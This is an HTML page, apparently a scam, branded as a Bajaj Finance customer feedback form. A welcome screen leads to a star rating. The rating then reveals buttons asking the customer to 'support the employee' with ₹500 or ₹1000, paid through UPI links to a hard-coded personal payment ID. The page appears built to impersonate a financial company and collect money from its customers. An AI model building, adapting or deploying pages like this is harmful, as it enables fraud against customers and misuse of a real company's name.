<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Bajaj Finance Feedback</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />

  <style>
    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

    body {
      margin: 0;
      padding: 0;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      background: #e5e7eb;
    }

    .page {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 10px;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      border-radius: 18px;
      padding: 16px;
      box-shadow: 0 10px 28px rgba(15, 23, 42, 0.2);
      border: 1px solid #e5e7eb;
      position: relative;
      overflow: hidden;
    }

    /* Welcome screen */
    .welcome {
      text-align: center;
    }

    .welcome-logo {
      width: 50px;
      height: 50px;
      border-radius: 16px;
      margin: 0 auto 10px;
      background: linear-gradient(135deg, #1d4ed8, #22c55e);
      display: flex;
      align-items: center;
      justify-content: center;
      color: #ffffff;
      font-weight: 700;
      font-size: 1.1rem;
      box-shadow: 0 8px 20px rgba(15,23,42,0.5);
    }

    .welcome-title {
      font-size: 1rem;
      font-weight: 600;
      color: #111827;
      margin-bottom: 6px;
    }

    .welcome-text {
      font-size: 0.86rem;
      color: #4b5563;
      margin-bottom: 14px;
    }

    .welcome-btn {
      padding: 10px 20px;
      border-radius: 999px;
      border: none;
      background: linear-gradient(135deg, #2563eb, #1d4ed8);
      color: #ffffff;
      font-size: 0.9rem;
      font-weight: 600;
      cursor: pointer;
      box-shadow: 0 6px 16px rgba(37, 99, 235, 0.5);
      width: 100%;
    }

    /* Main feedback content */
    .hidden { display: none; }

    header {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 8px;
    }

    .logo-circle {
      width: 34px;
      height: 34px;
      border-radius: 12px;
      background: linear-gradient(135deg, #2563eb, #22c55e);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      font-weight: 700;
    }

    h1 {
      font-size: 1.1rem;
      margin: 0;
      color: #1e293b;
    }

    .sub {
      margin: 3px 0 0;
      font-size: 0.85rem;
      color: #475569;
    }

    .employee-name {
      font-weight: 600;
      color: #111827;
    }

    .stars-section {
      margin-top: 14px;
      background: #f8fafc;
      padding: 12px;
      border-radius: 10px;
      border: 1px solid #e2e8f0;
    }

    .stars-label {
      font-size: 0.8rem;
      text-align: center;
      color: #64748b;
      margin-bottom: 6px;
    }

    .stars {
      display: flex;
      justify-content: center;
      gap: 10px;
    }

    .star {
      font-size: 32px;
      color: #d1d5db;
      cursor: pointer;
      transition: 0.2s;
    }

    .star.active {
      color: #facc15;
      text-shadow: 0 0 8px rgba(250,204,21,0.8);
      transform: scale(1.2);
    }

    .rating-text {
      text-align: center;
      font-size: 0.85rem;
      margin-top: 6px;
      color: #374151;
      min-height: 20px;
    }

    .wow {
      color: #16a34a;
      font-weight: 700;
    }

    .tip-section {
      display: none;
      margin-top: 14px;
      padding-top: 12px;
      border-top: 1px solid #e2e8f0;
    }

    .tip-title {
      font-weight: 600;
      font-size: 0.9rem;
      margin-bottom: 6px;
      color: #111827;
    }

    .fixed-amounts {
      display: flex;
      gap: 12px;
      margin-top: 4px;
      flex-wrap: wrap;
    }

    .amount-btn {
      flex: 1;
      padding: 12px;
      border-radius: 12px;
      text-align: center;
      text-decoration: none;
      font-weight: 600;
      color: white;
      box-shadow: 0 5px 14px rgba(0,0,0,0.25);
      font-size: 0.9rem;
    }

    .blue-btn { background: linear-gradient(135deg, #2563eb, #1e40af); }
    .green-btn { background: linear-gradient(135deg, #0d9488, #0f766e); }

    .amount-main { font-size: 1.05rem; }
    .amount-sub { font-size: 0.75rem; opacity: 0.9; }
  </style>
</head>
<body>

<div class="page">
  <div class="card">

    <!-- Welcome screen -->
    <div class="welcome" id="welcomeScreen">
      <div class="welcome-logo">BF</div>
      <div class="welcome-title">Thank you for being a Bajaj Finance customer</div>
      <p class="welcome-text">
        We appreciate your time in sharing feedback about our employee’s service.
      </p>
      <button class="welcome-btn" id="welcomeBtn">Continue to feedback</button>
    </div>

    <!-- Main feedback screen -->
    <div id="feedbackScreen" class="hidden">
      <header>
        <div class="logo-circle">FB</div>
        <div>
          <h1>How was your experience?</h1>
          <p class="sub">
            Service provided by <span class="employee-name" id="employeeName">Employee</span>
          </p>
        </div>
      </header>

      <section class="stars-section">
        <div class="stars-label">Tap a star to rate</div>
        <div class="stars">
          <span class="star" data-value="1">★</span>
          <span class="star" data-value="2">★</span>
          <span class="star" data-value="3">★</span>
          <span class="star" data-value="4">★</span>
          <span class="star" data-value="5">★</span>
        </div>
        <div class="rating-text" id="ratingText"></div>
      </section>

      <div class="tip-section" id="tipSection">
        <div class="tip-title">Support the employee</div>
        <div class="fixed-amounts">
          <a id="pay500" class="amount-btn blue-btn" href="#">
            <span class="amount-main">₹500</span><br>
            <span class="amount-sub">Standard appreciation</span>
          </a>
          <a id="pay1000" class="amount-btn green-btn" href="#">
            <span class="amount-main">₹1000</span><br>
            <span class="amount-sub">High appreciation</span>
          </a>
        </div>
      </div>
    </div>

  </div>
</div>

<script>
  // CONFIG
  var UPI_ID = "abhishektr258@okicici";
  var DEFAULT_EMPLOYEE = "Employee";

  // Welcome → Feedback
  var welcomeBtn = document.getElementById("welcomeBtn");
  var welcomeScreen = document.getElementById("welcomeScreen");
  var feedbackScreen = document.getElementById("feedbackScreen");

  welcomeBtn.addEventListener("click", function () {
    welcomeScreen.classList.add("hidden");
    feedbackScreen.classList.remove("hidden");
  });

  // Employee from URL ?emp=Name
  var params = new URLSearchParams(window.location.search);
  var emp = params.get("emp") || DEFAULT_EMPLOYEE;
  document.getElementById("employeeName").textContent = emp;

  // Prepare UPI Links
  var pay500 = document.getElementById("pay500");
  var pay1000 = document.getElementById("pay1000");

  var link500 = "upi://pay?pa=" + encodeURIComponent(UPI_ID)
              + "&pn=" + encodeURIComponent(emp)
              + "&am=500&cu=INR"
              + "&tn=" + encodeURIComponent("Appreciation for " + emp);

  var link1000 = "upi://pay?pa=" + encodeURIComponent(UPI_ID)
               + "&pn=" + encodeURIComponent(emp)
               + "&am=1000&cu=INR"
               + "&tn=" + encodeURIComponent("Appreciation for " + emp);

  pay500.setAttribute("href", link500);
  pay1000.setAttribute("href", link1000);

  // Rating logic
  var stars = document.querySelectorAll(".star");
  var ratingText = document.getElementById("ratingText");
  var tipSection = document.getElementById("tipSection");

  var messages = {
    1: "Sorry for the inconvenience.",
    2: "Thank you, we will improve.",
    3: "Thanks for your feedback!",
    4: "Great! Glad you liked the service.",
    5: "<span class='wow'>Excellent! Thank you for 5★</span>"
  };

  stars.forEach(function (star) {
    star.addEventListener("click", function () {
      var value = parseInt(star.getAttribute("data-value"), 10);

      // highlight stars
      stars.forEach(function (s) {
        var v = parseInt(s.getAttribute("data-value"), 10);
        if (v <= value) {
          s.classList.add("active");
        } else {
          s.classList.remove("active");
        }
      });

      ratingText.innerHTML = messages[value] || "";
      tipSection.style.display = "block";
    });
  });
</script>

</body>
</html>
